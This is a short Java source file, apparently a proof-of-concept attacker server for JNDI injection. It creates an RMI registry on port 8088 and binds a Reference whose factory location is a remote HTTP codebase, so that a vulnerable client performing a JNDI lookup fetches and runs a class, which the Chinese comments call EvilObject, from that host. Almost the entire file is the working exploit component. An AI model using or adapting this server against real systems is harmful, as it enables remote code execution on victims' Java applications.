package tmp;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author by Administrator on 2021/7/2.
 */
public class RMIServer {
    public static void main(String argv[]) {

        try {
            Registry registry =  LocateRegistry.createRegistry(8088);
            //如果通过rmi无法找到org.lain.poc.jndi.EvilObjectFactory，则尝试从factoryLocation 获取
            //因此，本地测试的话，如果factory正确，factoryLocation随便填写
            Reference reference = new Reference("ExportObject",
                    "http://10.253.106.36:8080",
                    "http://10.253.106.36:8080/" );
            //客户端通过evil查找，获取到EvilObject
            registry.bind("ExportObject", new ReferenceWrapper(reference));
            System.out.println("Ready!");
            System.out.println("Waiting for connection......");
        } catch (Exception e) {
            System.out.println("RMIServer: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
